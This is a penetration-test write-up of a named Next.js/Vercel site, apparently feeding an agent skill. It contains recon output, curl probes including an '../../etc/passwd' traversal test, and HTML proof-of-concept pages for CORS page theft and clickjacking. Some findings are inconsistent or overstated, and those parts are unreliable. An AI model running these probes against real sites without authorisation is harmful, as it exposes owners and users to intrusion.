# Next.js + Vercel Pentest Playbook — Reference

## Session Artifact: AutoReels (autoreels.in) — 2026-07-27

This file documents the detailed session that produced the `nextjs-vercel-security-assessment` skill. It contains the raw commands, PoC code, and remediation that were validated against a real target.

---

## Target Fingerprint

```
whatweb -v https://autoreels.in
→ Status: 200 OK
→ Title: AutoReels — AI Faceless Reel Generator
→ IP: 216.198.79.1 (US)
→ Server: Vercel
→ Next.js detected via x-powered-by headers
→ HSTS: max-age=63072000
→ CORS: access-control-allow-origin: *
```

### Headers at a Glance

| Header | Present |
|--------|---------|
| X-Frame-Options | ❌ MISSING |
| X-Content-Type-Options | ❌ MISSING (except on blob) |
| Content-Security-Policy | ❌ MISSING (only on blob) |
| Referrer-Policy | ❌ MISSING |
| Strict-Transport-Security | ✅ max-age=63072000 |
| Access-Control-Allow-Origin | ✅ `*` (WILDCARD) |
| X-Powered-By | ❌ Not set (Next.js omits by default) |

---

## Raw Recon Output

### DNS
```
autoreels.in → 216.198.79.1
NS: ns1.dns-parking.com (Hostinger)
```

### Subdomains (via subfinder)
```
vms.autoreels.in
api.autoreels.in
devcollab.autoreels.in
incubyte-assignment.autoreels.in
invoice-backend.autoreels.in
n8n.autoreels.in
```

Note: All subdomain DNS A-records are dead (no current resolution). These are historical records from when the services were deployed.

### Robots.txt
```
User-Agent: *
Allow: /
Disallow: /dashboard
Disallow: /create
Disallow: /library
Disallow: /billing
Disallow: /admin
Disallow: /reels
Disallow: /api
```

### Sitemap (17 URLs)
Tools: hashtag-generator, script-generator, ai-voiceover, video-transcript, caption-generator, youtube-downloader, instagram-downloader, quote-video-maker  
Blog: 3 posts (faceless reels, AI voices, Flux vs Nano Banana 2)  
Ideas: 8 categories (finance, fitness, real-estate, beauty, parenting, travel, tech, food)

---

## Check Results

### CORS — Wildcard
```bash
$ curl -sI -H "Origin: https://evil.com" https://autoreels.in | grep access-control
access-control-allow-origin: *
```
**CVSS:** 5.3 | **CWE:** CWE-942

### Security Headers — Clickjacking
```bash
$ curl -sI https://autoreels.in | grep -i "x-frame-options"
# ← No output
```
**CVSS:** 4.8 | **CWE:** CWE-693

### Blob Storage — Direct Access
```bash
$ curl -sI "https://2pdbyk39rsrkdlfq.public.blob.vercel-storage.com/reels/203cda9e-be4c-4aa3-9e09-191c24aac8fc/video-1785161126128.mp4"
HTTP/2 200 OK
content-type: video/mp4
cache-control: public, max-age=2592000
```
**Direct URLs (no auth):**
```
Video: https://2pdbyk39rsrkdlfq.public.blob.vercel-storage.com/reels/203cda9e-be4c-4aa3-9e09-191c24aac8fc/video-1785161126128.mp4
Thumb: https://2pdbyk39rsrkdlfq.public.blob.vercel-storage.com/reels/203cda9e-be4c-4aa3-9e09-191c24aac8fc/thumb-1785161126128.jpg
```
**CVSS:** 5.0 | **CWE:** CWE-200

### Auth Bypass — Server-Side
```bash
$ for p in dashboard create billing library; do
    curl -sL -o /dev/null -w "/$p → HTTP %{http_code}\n" --max-time 5 "https://autoreels.in/$p"
  done
/dashboard → HTTP 200 (23405 bytes)
/create → HTTP 200 (23405 bytes)
/billing → HTTP 200 (23405 bytes)
/library → HTTP 200 (23405 bytes)
```
**CVSS:** 4.3 | **CWE:** CWE-306

### Rate Limiting
```bash
$ for i in $(seq 1 10); do
    curl -sL -o /dev/null -w "%{http_code}\n" --max-time 3 "https://autoreels.in/signup"
  done
# All 10 → 200 (no throttling)
```
**CVSS:** 3.7 | **CWE:** CWE-307

### Clean Checks

| Check | Result | Notes |
|-------|--------|-------|
| SQLi via URL params | ✅ SAFE | All return 404 pages |
| Reflected XSS | ✅ SAFE | React auto-escapes |
| Path Traversal | ✅ BLOCKED | 403 on `../../etc/passwd` |
| Source Maps | ✅ BLOCKED | 403 on `.js.map` |
| OG Image SSRF | ✅ SAFE | Returns static PNG |
| GraphQL | ✅ NOT EXPOSED | All paths 404 |
| API Keys in JS | ✅ NOT FOUND | All bundles scanned |
| Open Redirect | ✅ NOT FOUND | No redirect params |

---

## PoC Exploit Files

### CORS Data Exfil — cors-poc.html
```html
<html><body><script>
fetch('https://autoreels.in/', { mode: 'cors', credentials: 'include' })
  .then(r => r.text())
  .then(t => alert('CORS EXPLOIT WORKS!\nPage stolen:\n' + t.substring(0,300)))
  .catch(e => alert('BLOCKED: ' + e));
</script></body></html>
```

### Clickjacking — clickjack.html
```html
<html><body>
<h2>Clickjacking PoC — AutoReels</h2>
<iframe src="https://autoreels.in/dashboard" width="800" height="600"
        style="opacity:0.5"></iframe>
<p>If visible → no clickjacking protection!</p>
</body></html>
```

---

## Remediation Commands (for the developer)

### 1. Security Headers via vercel.json
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Frame-Options", "value": "DENY" },
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Access-Control-Allow-Origin", "value": "https://autoreels.in" },
        { "key": "Content-Security-Policy", "value": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self'; connect-src 'self'; media-src 'self' *.blob.vercel-storage.com" }
      ]
    }
  ]
}
```

### 2. Auth Middleware — middleware.ts
```ts
import { withAuth } from "next-auth/middleware";
export default withAuth({ pages: { signIn: "/login" } });
export const config = {
  matcher: ["/dashboard", "/create", "/billing", "/library", "/admin", "/reels"]
};
```

### 3. Private Blob Storage
```js
// Replace: access: 'public'
// With: access: 'auth'
const { url } = await put('file.mp4', file, { access: 'auth' });

// Generate signed URLs per request
const client = createClient({ token: process.env.BLOB_READ_TOKEN });
const signedUrl = await client.generateDownloadUrl(uuid);
```

### 4. Rate Limiting via Edge Middleware
```ts
import { rateLimit } from "@vercel/edge-rate-limit";
export default rateLimit({ max: 5, windowMs: 60000 });
```

---

## Session Reference

- **Target:** https://autoreels.in (friend's test site)
- **Date:** 2026-07-27 14:56 UTC
- **Methodology:** VULCAN Bug Bounty | Shannon 5-Phase
- **Duration:** ~15 minutes
- **Findings: 4 Medium, 3 Low, 0 Critical/High**
